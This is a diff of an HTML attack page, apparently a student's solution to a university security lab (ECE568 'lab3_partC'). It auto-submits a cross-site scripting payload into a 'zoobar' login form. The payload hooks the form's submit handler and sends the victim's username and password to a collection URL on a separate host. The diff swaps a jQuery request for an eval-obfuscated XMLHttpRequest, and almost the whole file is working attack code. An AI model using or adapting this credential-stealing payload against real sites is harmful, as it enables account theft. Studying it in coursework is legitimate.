@@ -1,5 +1,5 @@
 <html>
-	<body onload="">
+	<body>
 		<script type="text/javascript">
 			function post(path, params, method) {
 				method = method || "post"; // Set method to post by default if not specified.
@@ -26,23 +26,21 @@
 				
 		
 				
-			post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';if(!document.getElementById('myJquery')){jq=document.createElement('script');jq.id='myJquery';jq.src='http://code.jquery.com/jquery-1.11.3.min.js';document.body.appendChild(jq);}document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();$.ajax({url:theUrl,async:false});};", loginpassword:"" , submitlogin:"Log+in"});
+			post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();xhttp=eval(decodeURIComponent('new%20XMLHttpRequest%28%29'));xhttp.open('GET',theUrl,false);xhttp.send();};", loginpassword:"" , submitlogin:"Log+in"});
 				
 			/*
+			
 				'' onFocus=
 				document.getElementsByClassName('warning')[0].innerHTML='';
-				if(!document.getElementById('myJquery')){
-					jq=document.createElement(j'script');
-					jq.id='myJquery';
-					jq.src='http://code.jquery.com/jquery-1.11.3.min.js';
-					document.body.appendChild(jq);
-				}
 				document.getElementsByName('login_form')[0].onsubmit=function(){
 					loginusername=document.getElementsByName('loginusername')[0];
 					loginpassword=document.getElementsByName('loginpassword')[0];
 					theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();
-					$.ajax({url:theUrl,async:false});
-				};
+					xhttp=eval(decodeURIComponent('new%20XMLHttpRequest%28%29'));
+					xhttp.open('GET',theUrl,false);
+					xhttp.send();	
+				};			
+				
 				
 			*/
 			
